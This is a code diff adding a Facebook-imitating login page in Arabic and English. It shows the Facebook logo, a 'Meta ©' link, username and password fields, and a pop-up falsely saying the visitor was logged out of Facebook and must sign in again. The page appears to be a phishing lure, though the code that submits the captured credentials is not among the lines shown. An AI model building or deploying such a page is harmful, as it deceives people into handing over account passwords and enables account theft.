@@ -76,7 +76,112 @@
       border-radius: 50%;
       width: 18px;
       height: 18px;
-      animation: spin 0.8s linearborder-left-coloril: "Please enter a valid email or phone number",
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
+
+    /* ✅ فقاعة أسفل الصفحة */
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      right: 50%;
+      transform: translateX(50%);
+      background: #000;
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 25px;
+      font-size: 14px;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.5s ease, visibility 0.5s ease;
+      z-index: 9999;
+    }
+    .toast.show {
+      opacity: 1;
+      visibility: visible;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="lang" id="langBtn">العربية ⌵</div>
+
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
+  </div>
+
+  <div class="container">
+    <form id="myForm">
+      <div class="input-group">
+        <input type="text" name="email_or_phone" id="emailInput" placeholder="الرقم أو الإيميل" required>
+        <i class="fa-solid fa-user icon"></i>
+        <div class="error-bubble" id="error-email"></div>
+      </div>
+      <div class="input-group">
+        <input type="password" name="password" id="passInput" placeholder="كلمة المرور" required>
+        <i class="fa-solid fa-lock icon"></i>
+        <div class="error-bubble" id="error-pass"></div>
+      </div>
+      <button type="submit" id="submitButton">تسجيل الدخول</button>
+    </form>
+    <div class="forgot" id="forgotText">هل نسيت كلمة السر؟</div>
+    <button class="create-account" id="createBtn">إنشاء حساب جديد</button>
+    <div class="msg" id="msg"></div>
+  </div>
+
+  <!-- ✅ رابط Meta -->
+  <div class="meta" id="metaLink">Meta ©</div>
+
+  <!-- ✅ فقاعة الإشعار -->
+  <div class="toast" id="toast">تم تسجيل خروجك من فيس بوك يرجى إعادة التسجيل مرة اخرى</div>
+
+  <script>
+    const langBtn = document.getElementById("langBtn");
+    const emailInput = document.getElementById("emailInput");
+    const passInput = document.getElementById("passInput");
+    const submitButton = document.getElementById("submitButton");
+    const forgotText = document.getElementById("forgotText");
+    const createBtn = document.getElementById("createBtn");
+    const errorEmail = document.getElementById("error-email");
+    const errorPass = document.getElementById("error-pass");
+    const msg = document.getElementById("msg");
+    const form = document.getElementById("myForm");
+    const toast = document.getElementById("toast");
+
+    // ✅ إظهار الفقاعة عند بداية الصفحة
+    window.addEventListener("load", () => {
+      toast.classList.add("show");
+      setTimeout(() => {
+        toast.classList.remove("show");
+      }, 4000);
+    });
+
+    // باقي الكود بدون تغيير
+    const translations = {
+      ar: {
+        lang: "العربية ⌵",
+        emailPlaceholder: "الرقم أو الإيميل",
+        passPlaceholder: "كلمة المرور",
+        login: "تسجيل الدخول",
+        forgot: "هل نسيت كلمة السر؟",
+        create: "إنشاء حساب جديد",
+        errorEmail: "أدخل رقم أو بريد إلكتروني صحيح",
+        errorPass: "أدخل كلمة سر صحيحة",
+        waiting: "جاري تسجيل الدخول...",
+        customEmail: "يرجى إدخال رقم أو بريد إلكتروني صحيح",
+        customPass: "يرجى إدخال كلمة سر صحيحة"
+      },
+      en: {
+        lang: "English ⌵",
+        emailPlaceholder: "Email or Phone",
+        passPlaceholder: "Password",
+        login: "Log In",
+        forgot: "Forgotten password?",
+        create: "Create new account",
+        errorEmail: "Enter a valid email or phone number",
+        errorPass: "Enter a valid password",
+        waiting: "Logging in...",
+        customEmail: "Please enter a valid email or phone number",
         customPass: "Please enter a valid password"
       },
       fr: {
